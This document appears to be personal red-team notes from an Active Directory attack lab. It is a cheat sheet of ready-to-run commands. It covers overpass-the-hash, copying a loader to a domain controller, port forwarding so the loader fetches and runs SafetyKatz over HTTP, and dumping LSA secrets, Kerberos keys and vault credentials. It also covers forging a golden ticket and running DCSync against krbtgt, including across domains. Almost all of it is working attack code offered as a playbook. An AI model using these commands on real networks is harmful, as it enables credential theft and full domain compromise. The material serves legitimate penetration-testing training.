
### **OVERPASS THE HASH**
*Using SafetyKatz*
```powershell
.\SafetyKatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<HASH> /run:cmd.exe" "exit"
```
Run invishell and look for other system access
```powershell
Find-PSRemotingLocalAdminAccess -Verbose
```

### **Extract Credentials**
Copy the loader on the dc and use the port forwarding technique to use mimikatz and extract all creds
```powershell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
```
```powershell
winrs -r:dcorp-dc cmd
```
```powershell
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.115
```
```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
```
```mimikatz
lsadump::lsa /patch
```

```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```
to check
```powershell
klist
```
### **Extract from credential vault**
```powershell
Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'
```

### **Using the secrets of krbtgt account, create a Golden ticket**
Just use BetterSafetyKatz
```powershell
> C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<NOME DOMINIO> /sid:<SID DC(lsa dump safetykatz> /aes256:<AES KRBTGT> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

### **execute the DCSync attack to pull hashes of the krbtgt user**
Now use safetykatz to extract the hash of any user
```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```
![[Pasted image 20231025125418.png]]
### **DCSync attack to another domain using ktbTGT user**
```cmd
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<TARGET DOMAIN>" "exit"
```
